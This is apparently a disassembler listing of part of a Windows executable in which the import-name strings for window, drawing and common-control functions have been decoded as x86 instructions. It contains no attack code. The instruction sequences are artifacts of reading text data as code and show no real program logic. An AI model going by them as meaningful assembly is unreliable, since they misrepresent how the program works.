  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
